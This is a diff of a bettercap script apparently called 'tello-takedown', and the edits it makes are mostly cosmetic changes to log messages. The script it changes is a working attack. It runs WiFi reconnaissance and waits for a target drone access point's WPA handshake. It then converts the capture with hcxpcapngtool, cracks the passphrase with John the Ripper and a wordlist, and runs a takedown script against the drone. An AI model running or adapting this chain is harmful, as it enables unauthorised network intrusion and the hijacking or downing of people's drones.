@@ -3,17 +3,10 @@ require("config");
 var target; // Target ap (drone) bssid
 var hostname;
 
-log('📝 Script tello-takedown started');
+log('ℹ️ Script tello-takedown started');
 
-log('📝 Turning on wifi recon');
+log('ℹ️ Turning on wifi recon');
 run('wifi.recon on');
-//run('!sleep 2')
-
-/*log('📝 Setting up ticker');
-run('set wifi.show.sort clients desc');
-run('set wifi.show.limit 20')
-run('set ticker.commands "clear; wifi.show"');
-run('ticker on');*/
 
 // Polyfill for "startsWith" String function
 if (!String.prototype.startsWith) {
@@ -41,7 +34,7 @@ if (!String.prototype.includes) {
 onEvent('mod.started', function(event){
     if(event.data == 'wifi'){
         run('wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11'); // Only scan 2,4 GHz channels
-        log('📝 Turning off event stream');
+        log('ℹ️ Turning off event stream');
         run('events.stream off');
     }
 });
@@ -94,7 +87,7 @@ onEvent('wifi.client.handshake', function(event){
         //cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' ' + handshakesFileName;
         log('🪄 Converting packets to JtR wpapsk format');
         cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName + ' &> /dev/null'; //TODO: Add &> /dev/null?
-        log('   Command: ' + cmd);
+        log('ℹ️ Command: ' + cmd);
         run('!'+cmd);
 
         //log('Sleeping...');
@@ -104,7 +97,7 @@ onEvent('wifi.client.handshake', function(event){
         //cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 22000 -a 0' +
         //    ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName + ' ' +  wordlistFileName;
         cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName + ' &> /dev/null';
-        log('   Command: ' + cmd);
+        log('ℹ️ Command: ' + cmd);
         run('!'+cmd);
 
         //TODO: Monitor output file?
@@ -114,6 +107,7 @@ onEvent('wifi.client.handshake', function(event){
 
         log('💎 Taking down 🚁 and executing golang code');
         cmd = 'sh takedown.sh ' + hostname + ' ' + johnWPApskFileName;
+        log('ℹ️ Command: ' + cmd);
         run('!'+cmd);
     }
 });
